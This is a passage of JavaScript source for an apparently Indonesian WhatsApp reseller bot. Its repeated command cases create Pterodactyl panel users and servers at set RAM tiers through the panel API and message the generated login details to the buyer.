    if (!isSeller) return reply('Khusus reseller!');
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);
    let username = t[0];
    let u = t[1] + '@s.whatsapp.net';
    let name = username;
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "4200";
    let cpu = "0";
    let disk = "4200";
    let email = username + "1398@gmail.com";
    akunlo = "https://telegra.ph/file/74f26656f3f88627dbfeb.jpg"; 
    if (!u) return;
    let d = (await KhaerulZx.onWhatsApp(u.split`@`[0]))[0] || {};
    function generateRandomPassword(length) {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let password = "";
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * chars.length);
            password += chars[randomIndex];
        }
        return password;
    }
    let password = generateRandomPassword(12);
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });
    let data = await f.json();
    if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes;
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        }
    });
    m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`);
    let ctf = `
*Berikut adalah data panel Anda*
*DARI @${m?.sender.split('@')[0]}*

┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *RAM :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *LOGIN :* ${global.domain}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GARANSI? BAWA BUKTI TF*
`;
    await KhaerulZx.sendMessage(u, { text: ctf });
    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "name": name,
            "description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꜰɪɴꜱɪɪ",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 0,
                "backups": 0,
                "allocations": 0
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });
    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));
    let server = res.attributes;
    await m.reply(`
*Sukses Membuat Panel dan Server ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim Ke @${u.split`@`[0]} Bang ${pushname}`);
}
break;
case "5gb": {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isSeller) return reply('Khusus reseller!');
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);
    let username = t[0];
    let u = t[1] + '@s.whatsapp.net';
    let name = username;
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "5000";
    let cpu = "0";
    let disk = "5000";
    let email = username + "1398@gmail.com";
    akunlo = "https://telegra.ph/file/74f26656f3f88627dbfeb.jpg"; 
    if (!u) return;
    let d = (await KhaerulZx.onWhatsApp(u.split`@`[0]))[0] || {};
    function generateRandomPassword(length) {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let password = "";
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * chars.length);
            password += chars[randomIndex];
        }
        return password;
    }
    let password = generateRandomPassword(12);
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });
    let data = await f.json();
    if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes;
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        }
    });
    m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`);
    let ctf = `
*Berikut adalah data panel Anda*
*DARI @${m?.sender.split('@')[0]}*

┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *RAM :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *LOGIN :* ${global.domain}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GARANSI? BAWA BUKTI TF*
`;
    await KhaerulZx.sendMessage(u, { text: ctf });
    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "name": name,
            "description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꜰɪɴꜱɪɪ",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 0,
                "backups": 0,
                "allocations": 0
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });
    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));
    let server = res.attributes;
    await m.reply(`
*Sukses Membuat Panel dan Server ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim Ke @${u.split`@`[0]} Bang ${pushname}`);
}
break;
case "6gb": {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isSeller) return reply('Khusus reseller!');
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);
    let username = t[0];
    let u = t[1] + '@s.whatsapp.net';
    let name = username;
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "6000";
    let cpu = "0";
    let disk = "6000";
    let email = username + "1398@gmail.com";
    akunlo = "https://telegra.ph/file/74f26656f3f88627dbfeb.jpg"; 
    if (!u) return;
    let d = (await KhaerulZx.onWhatsApp(u.split`@`[0]))[0] || {};
    function generateRandomPassword(length) {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let password = "";
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * chars.length);
            password += chars[randomIndex];
        }
        return password;
    }
    let password = generateRandomPassword(12);
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });
    let data = await f.json();
    if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes;
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        }
    });
    m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`);
    let ctf = `
*Berikut adalah data panel Anda*
*DARI @${m?.sender.split('@')[0]}*

┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *RAM :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *LOGIN :* ${global.domain}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GARANSI? BAWA BUKTI TF*
`;
    await KhaerulZx.sendMessage(u, { text: ctf });
    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "name": name,
            "description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꜰɪɴꜱɪɪ",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 0,
                "backups": 0,
                "allocations": 0
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });
    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));
    let server = res.attributes;
    await m.reply(`
*Sukses Membuat Panel dan Server ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim Ke @${u.split`@`[0]} Bang ${pushname}`);
}
break;
case "7gb": {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isSeller) return reply('Khusus reseller!');
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);
    let username = t[0];
    let u = t[1] + '@s.whatsapp.net';
    let name = username;
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "7000";
    let cpu = "0";
    let disk = "7000";
    let email = username + "1398@gmail.com";
    akunlo = "https://telegra.ph/file/74f26656f3f88627dbfeb.jpg"; 
    if (!u) return;
    let d = (await KhaerulZx.onWhatsApp(u.split`@`[0]))[0] || {};
    function generateRandomPassword(length) {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let password = "";
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * chars.length);
            password += chars[randomIndex];
        }
        return password;
    }
    let password = generateRandomPassword(12);
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });
    let data = await f.json();
    if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes;
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        }
    });
    m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`);
    let ctf = `
*Berikut adalah data panel Anda*
*DARI @${m?.sender.split('@')[0]}*

┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *RAM :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *LOGIN :* ${global.domain}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GARANSI? BAWA BUKTI TF*
`;
    await KhaerulZx.sendMessage(u, { text: ctf });
    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "name": name,
            "description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꜰɪɴꜱɪɪ",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 0,
                "backups": 0,
                "allocations": 0
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });
    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));
    let server = res.attributes;
    await m.reply(`
*Sukses Membuat Panel dan Server ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim Ke @${u.split`@`[0]} Bang ${pushname}`);
}
break;
case "unli": {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isSeller) return reply('Khusus reseller!');
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);
    let username = t[0];
    let u = t[1] + '@s.whatsapp.net';
    let name = username + "Unli";
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "0";
    let cpu = "0";
    let disk = "0";
    let email = username + "1398@gmail.com";
    akunlo = "https://telegra.ph/file/74f26656f3f88627dbfeb.jpg"; 
    if (!u) return;
    let d = (await KhaerulZx.onWhatsApp(u.split`@`[0]))[0] || {};
    function generateRandomPassword(length) {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let password = "";
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * chars.length);
            password += chars[randomIndex];
        }
        return password;
    }
    let password = generateRandomPassword(12);
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });
    let data = await f.json();
    if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes;
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        }
    });
    m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`);
    let ctf = `
*Berikut adalah data panel Anda*
*DARI @${m?.sender.split('@')[0]}*

┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *RAM :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *LOGIN :* ${global.domain}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GARANSI? BAWA BUKTI TF*
`;
    await KhaerulZx.sendMessage(u, { text: ctf });
    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "name": name,
            "description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꜰɪɴꜱɪɪ",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 0,
                "backups": 0,
                "allocations": 0
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });
    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));
    let server = res.attributes;
    await m.reply(`
*Sukses Membuat Panel dan Server ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim Ke @${u.split`@`[0]} Bang ${pushname}`);
}
break;
case "8gb": {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isSeller) return reply('Khusus reseller!');
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);
    let username = t[0];
    let u = t[1] + '@s.whatsapp.net';
    let name = username;
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "8000";
    let cpu = "0";
    let disk = "8000";
    let email = username + "1398@gmail.com";
    akunlo = "https://telegra.ph/file/74f26656f3f88627dbfeb.jpg"; 
    if (!u) return;
    let d = (await KhaerulZx.onWhatsApp(u.split`@`[0]))[0] || {};
    function generateRandomPassword(length) {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let password = "";
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * chars.length);
            password += chars[randomIndex];
        }
        return password;
    }
    let password = generateRandomPassword(12);
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });
    let data = await f.json();
    if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes;
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        }
    });
    m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`);
    let ctf = `
*Berikut adalah data panel Anda*
*DARI @${m?.sender.split('@')[0]}*

┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *RAM :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *LOGIN :* ${global.domain}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GARANSI? BAWA BUKTI TF*
`;
    await KhaerulZx.sendMessage(u, { text: ctf });
    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "name": name,
            "description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꜰɪɴꜱɪɪ",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 0,
                "backups": 0,
                "allocations": 0
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });
    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));
    let server = res.attributes;
    await m.reply(`
*Sukses Membuat Panel dan Server ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim Ke @${u.split`@`[0]} Bang ${pushname}`);
}
break;
case "9gb": {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isSeller) return reply('Khusus reseller!');
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);
    let username = t[0];
    let u = t[1] + '@s.whatsapp.net';
    let name = username;
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "9000";
    let cpu = "0";
    let disk = "9000";
    let email = username + "1398@gmail.com";
    akunlo = "https://telegra.ph/file/74f26656f3f88627dbfeb.jpg"; 
    if (!u) return;
    let d = (await KhaerulZx.onWhatsApp(u.split`@`[0]))[0] || {};
    function generateRandomPassword(length) {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let password = "";
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * chars.length);
            password += chars[randomIndex];
        }
        return password;
    }
    let password = generateRandomPassword(12);
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });
    let data = await f.json();
    if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes;
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        }
    });
    m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`);
    let ctf = `
*Berikut adalah data panel Anda*
*DARI @${m?.sender.split('@')[0]}*

┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *RAM :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *LOGIN :* ${global.domain}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GARANSI? BAWA BUKTI TF*
`;
    await KhaerulZx.sendMessage(u, { text: ctf });
    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "name": name,
            "description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꜰɪɴꜱɪɪ",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 0,
                "backups": 0,
                "allocations": 0
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });
    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));
    let server = res.attributes;
    await m.reply(`
*Sukses Membuat Panel dan Server ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim Ke @${u.split`@`[0]} Bang ${pushname}`);
}
break;
case "ramlist":
if (banned.includes(m.sender)) {
    return;
    }

lrm = `RAM YANG TERSEDIA :
1GB ✅
2GB ✅
3GB ✅
4GB ✅
5GB ✅
6GB ✅️
7GB ✅️
8GB ✅️
9GB ✅️
UNLI ✅`
KhaerulZx.sendMessage(from, {text : lrm}, {quoted : fcall})
break 
/*case 'panel': {
if (banned.includes(m.sender)) {
    return;
    }
    if (!isSeller) return reply('Khusus reseller!');
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username2 = t[0];
let u2 = t[1];

let sections = [{
title: 'ʟɪsᴛ',
highlight_label: 'Recomended',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.unli ${username2},${u2}`
},
{
title: '1Gb', 
description: "1Gb Ram/50 Cpu", 
id: `.1gb ${username2},${u2}`
},
{
title: '2Gb', 
description: "2Gb Ram/70 Cpu", 
id: `.2gb ${username2},${u2}`
},
{
title: '3Gb', 
description: "3Gb Ram/100 Cpu", 
id: `.3gb ${username2},${u2}`
},
{
title: '4Gb', 
description: "4Gb Ram/125 Cpu", 
id: `.4gb ${username2},${u2}`
},
{
title: '5Gb', 
description: "5Gb Ram/150 Cpu", 
id: `.5gb ${username2},${u2}`
},
{
title: '6Gb', 
description: "6Gb Ram/175 Cpu", 
id: `.6gb ${username2},${u2}`
},
{
title: '7Gb', 
description: "7Gb Ram/175 Cpu", 
id: `.7gb ${username2},${u2}`
},
{
title: '8Gb', 
description: "8Gb Ram/200 Cpu", 
id: `.8gb ${username2},${u2}`
}]
}]

let listMessage = {
    title: 'List Panel', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363247886007681@newsletter',
 newsletterName: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꜰɪɴꜱɪɪ', 
 serverMessageId: -1
},
